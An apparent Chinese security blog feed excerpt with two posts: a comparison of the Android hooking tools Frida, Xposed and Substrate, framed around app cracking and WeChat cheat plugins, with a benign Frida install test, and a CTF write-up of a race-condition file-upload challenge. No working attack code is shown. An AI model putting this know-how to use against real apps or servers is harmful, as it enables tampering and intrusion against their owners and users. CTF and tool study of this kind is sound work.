title="Frida的优缺点"></a>Frida的优缺点</h5><blockquote><p>优点：在上面我们可以看到他的优点在于配置环境很简单，操作也很便捷，对于破解者开发阶段非常好用。支持Java层和Native层hook操作，在Native层hook如果是非基本类型的话操作有点麻烦。</p></blockquote><blockquote><p>缺点：因为他只适用于破解者在开发阶段，也就是他没法像Xposed用于实践生产中，比如我写一个微信外挂用Frida写肯定不行的，因为他无法在手机端运行。也就是破解者用的比较多。</p></blockquote><h5 id="SubstrateCydia的优缺点"><a href="#SubstrateCydia的优缺点" class="headerlink" title="SubstrateCydia的优缺点"></a>SubstrateCydia的优缺点</h5><blockquote><p>优点：可以运行在手机端，和Xposed类似可以用于实践生产中。支持Java层和Native层的hook操作，但是Java层hook不怎么常用，用的比较多的是Native层hook操作，因为他也是Android工程可以引用系统api，操作更为方便</p></blockquote><blockquote><p>缺点：和Xposed一样安装配置环境繁琐，兼容性差。</p></blockquote><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><blockquote><p>以上这三个工具可以说是现在用的最多的hook工具了，总结一句话就是写Java层Hook还是Xposed方便，写Native层Hook还是Cydia了，而对于破解者开发那还是Frida最靠谱了。写外挂最难的也是最重要的不是<br>写代码而是寻找hook点，也就是逆向分析app找到那个地方，然后写hook代码实现插件功能。</p></blockquote><h3 id="frida-install"><a href="#frida-install" class="headerlink" title="frida install"></a>frida install</h3><pre><code class="bash">pip install frida-tools下载frida-serverhttps://github.com/frida/frida/releases</code></pre><h3 id="测试是否安装成功"><a href="#测试是否安装成功" class="headerlink" title="测试是否安装成功"></a>测试是否安装成功</h3><blockquote><p>在terminal中运行cat命令</p></blockquote><p><img src="/images/pasted-126.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>新开terminal，运行以下代码</p></blockquote><pre><code class="python">import fridadef on_message(message, data):    print(&quot;[on_message] message:&quot;, message, &quot;data:&quot;, data)session = frida.attach(&quot;cat&quot;)script = session.create_script(&quot;&quot;&quot;rpc.exports.enumerateModules = function () {  return Process.enumerateModules();};&quot;&quot;&quot;)script.on(&quot;message&quot;, on_message)script.load()print([m[&quot;name&quot;] for m in script.exports.enumerate_modules()])</code></pre><blockquote><p>输出类似如下信息,即说明安装成功</p></blockquote><pre><code class="bash">[u&#39;cat&#39;, u&#39;libSystem.B.dylib&#39;, u&#39;libcache.dylib&#39;, u&#39;libcommonCrypto.dylib&#39;, u&#39;libcompiler_rt.dylib&#39;, u&#39;libcopyfile.dylib&#39;, u&#39;libcorecrypto.dylib&#39;, u&#39;libdispatch.dylib&#39;, u&#39;libdyld.dylib&#39;, u&#39;libkeymgr.dylib&#39;, u&#39;liblaunch.dylib&#39;, u&#39;libmacho.dylib&#39;, u&#39;libquarantine.dylib&#39;, u&#39;libremovefile.dylib&#39;, u&#39;libsystem_asl.dylib&#39;, u&#39;libsystem_blocks.dylib&#39;, u&#39;libsystem_c.dylib&#39;, u&#39;libsystem_configuration.dylib&#39;, u&#39;libsystem_coreservices.dylib&#39;, u&#39;libsystem_darwin.dylib&#39;, u&#39;libsystem_dnssd.dylib&#39;, u&#39;libsystem_info.dylib&#39;, u&#39;libsystem_m.dylib&#39;, u&#39;libsystem_malloc.dylib&#39;, u&#39;libsystem_networkextension.dylib&#39;, u&#39;libsystem_notify.dylib&#39;, u&#39;libsystem_sandbox.dylib&#39;, u&#39;libsystem_secinit.dylib&#39;, u&#39;libsystem_kernel.dylib&#39;, u&#39;libsystem_platform.dylib&#39;, u&#39;libsystem_pthread.dylib&#39;, u&#39;libsystem_symptoms.dylib&#39;, u&#39;libsystem_trace.dylib&#39;, u&#39;libunwind.dylib&#39;, u&#39;libxpc.dylib&#39;, u&#39;libobjc.A.dylib&#39;, u&#39;libc++abi.dylib&#39;, u&#39;libc++.1.dylib&#39;, u&#39;dyld&#39;]</code></pre><h3 id="Refer"><a href="#Refer" class="headerlink" title="Refer"></a>Refer</h3><p><a href="https://blog.csdn.net/jiangwei0910410003/article/details/80372118" target="_blank" rel="noopener">https://blog.csdn.net/jiangwei0910410003/article/details/80372118</a></p><p><a href="https://www.frida.re/docs/home/" target="_blank" rel="noopener">https://www.frida.re/docs/home/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Android三大框架对比&quot;&gt;&lt;a href=&quot;#Android三大框架对比&quot; class=&quot;headerlink&quot; title=&quot;Android三大框架对比&quot;&gt;&lt;/a&gt;Android三大框架对比&lt;/h3&gt;&lt;h4 id=&quot;Frida，Xposed，Substrat
      
    
    </summary>
    
      <category term="tools" scheme="https://bufsnake.github.io/categories/tools/"/>
    
    
      <category term="android" scheme="https://bufsnake.github.io/tags/android/"/>
    
      <category term="android hook" scheme="https://bufsnake.github.io/tags/android-hook/"/>
    
      <category term="android frida" scheme="https://bufsnake.github.io/tags/android-frida/"/>
    
  </entry>
  
  <entry>
    <title>记一次简单的条件竞争的题目</title>
    <link href="https://bufsnake.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E7%9A%84%E9%A2%98%E7%9B%AE.html"/>
    <id>https://bufsnake.github.io/记一次简单的条件竞争的题目.html</id>
    <published>2019-08-22T12:50:08.000Z</published>
    <updated>2019-11-25T09:42:53.168Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote><p>一直对这个漏洞只有概念上的认知，没有做过相关的题目，就找了一个入门的练练手</p></blockquote><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p><img src="/images/pasted-116.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>我们可以控制文件的名字和文件的内容</p></blockquote><p><img src="/images/pasted-117.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-118.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>但是当我们访问的时候去发现访问不到，猜想应该是被删了，这就要利用条件竞争这个漏洞了</p></blockquote><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><blockquote><p>创建一个多线程程序不断的向服务器发起请求创建一个文件，在创建一个程序循环读取这个文件</p></blockquote><blockquote><p>这里使用burp suite进行申请创建文件，写一个死循环读取这个文件</p></blockquote><p><img src="/images/pasted-119.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-120.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>在start attack之前需要先运行访问的脚本</p></blockquote><p><img src="/images/pasted-124.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-122.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-123.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-125.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>可以得到内容，这题旨在能够访问到这个文件就能拿到flag</p></blockquote><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>Y3RmZXIldTY2MkYldTRFMEQldTY2MkYldTc3MEIldTUyMzBiYXNlJXU1QzMxJXU2MEYzJXU4OUUzJXU0RTAwJXU0RTBCJXU1NDYy</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;一直对这个漏洞只有概念上的认知，没有做过相关的题目，就找了一个入门的练练手&lt;/p&gt;
&lt;/blockquote&gt;
&lt;
      
    
    </summary>
    
      <category term="web" scheme="https://bufsnake.github.io/categories/web/"/>
    
    
      <category term="web" scheme="https://bufsnake.github.io/tags/web/"/>
    
  </entry>
  
</feed>
